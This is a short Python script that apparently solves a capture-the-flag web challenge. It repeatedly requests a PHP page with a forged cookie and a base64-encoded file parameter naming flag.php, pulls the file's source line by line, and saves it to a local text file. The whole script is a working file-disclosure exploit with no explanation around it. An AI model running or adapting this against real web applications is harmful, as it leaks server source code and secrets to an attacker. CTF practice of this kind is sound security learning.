import requests
import sys
cookies = {'key': 'idf'}

for i in range(0, 20):
    #url = "http://ctf.idf.cn/game/web/40/index.php?line="+str(i)+"&file=aW5kZXgucGhw"
    url = "http://ctf.idf.cn/game/web/40/index.php?line="+str(i)+"&file=ZmxhZy5waHA="
    wp = requests.get(url, cookies=cookies)
    filename = u"C:/flag.txt"
    fp = open(filename, 'a')
    print(wp.text)
    fp.write(wp.text)
    fp.close()

print("successed!")